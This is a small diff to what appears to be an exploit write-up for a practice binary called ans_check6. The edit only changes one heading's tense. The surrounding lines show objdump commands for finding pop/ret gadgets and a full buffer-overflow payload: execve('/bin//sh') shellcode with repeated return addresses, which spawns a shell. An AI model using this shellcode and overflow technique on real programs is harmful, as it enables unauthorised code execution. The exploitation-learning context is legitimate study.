@@ -44,7 +44,7 @@ objdump -D ans_check6 | less
 objdump -D ans_check6 | grep -B3 ret | grep -A1 pop
 ```
 
-## The payload I use
+## The payload I used
 ```
 ./ans_check6 $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90'+'\x21\x86\x04\x08'*55+'\x91\x83\x04\x08'")
 ```
